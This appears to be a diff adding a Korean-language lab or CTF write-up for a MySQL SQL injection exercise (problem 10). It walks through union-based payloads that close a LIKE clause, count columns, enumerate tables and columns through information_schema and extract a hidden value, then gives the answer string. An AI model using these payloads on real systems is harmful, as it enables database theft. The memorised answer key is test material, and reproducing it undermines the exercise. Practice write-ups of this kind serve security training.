@@ -1,0 +1,62 @@
+===============================
+
+* SQL Injection MySQL 문제 10번
+
+===============================
+
+1. 풀이과정
+ 1) 쿼리문 유추
+
+select 컬럼들 from 주소 where 읍면동 like '% %'
+
+ 2) 공격 포인트
+
+삼성동%' or 거짓
+select 컬럼들 from 주소 where 읍면동 like '%역삼동%' or 'j'='p %'
+ 
+검색어 : 역삼동%' or 'j'='p
+공격어 : 역삼동%' [공격구문] or 'j'='p
+
+
+ 3) Union 제약사항
+
+컬럼수 찾기 null 개수
+
+select 컬럼들 from 주소 where 읍면동 like '%역삼동%' union
+select null,null,null,null from dual where 'p%'='p%';
+
+null을 하나씩 추가해보면서 확인 - 5개에서 결과가 나옴
+검색어 :역삼동%' union select null,null,null,null,null from dual where 'p%'='p
+
+type 확인 'a'이나 1 등을 넣어 확인
+역삼동%' union select 'a','b','c','d','e' from dual where 'p%'='p
+
+역삼동%' union select table_name,'','','','' from user_tables where 'p%'='p
+
+
+ 4) 테이블명 : union_answer
+
+전체 테이블 조회 방법
+select table_name from user_tables  - oracle
+select table_name from information_schema.tables - mysql
+
+따라서 mysql로하기때문에 검색어는 다음과 같다.
+검색어 : 역삼동%' union select table_name,'','','','' from information_schema.tables where 'p%'='p
+
+
+ 5) union_answer 테이블의 컬럼명
+
+select column_name from information_schema.columns where table_name = 'union_answer'
+
+검색어 : 역삼동%' union select column_name,'','','','' from information_schema.columns where table_name = 'union_answer' or 'kw%'='k
+
+answer_column
+
+
+ 6) answer_column 데이터 탈취
+
+검색어 : 역삼동%' union select answer_column,'','','','' from union_answer where 'k%'='k
+
+2. 정답
+정답 : this_is_answer_answer
+===============================
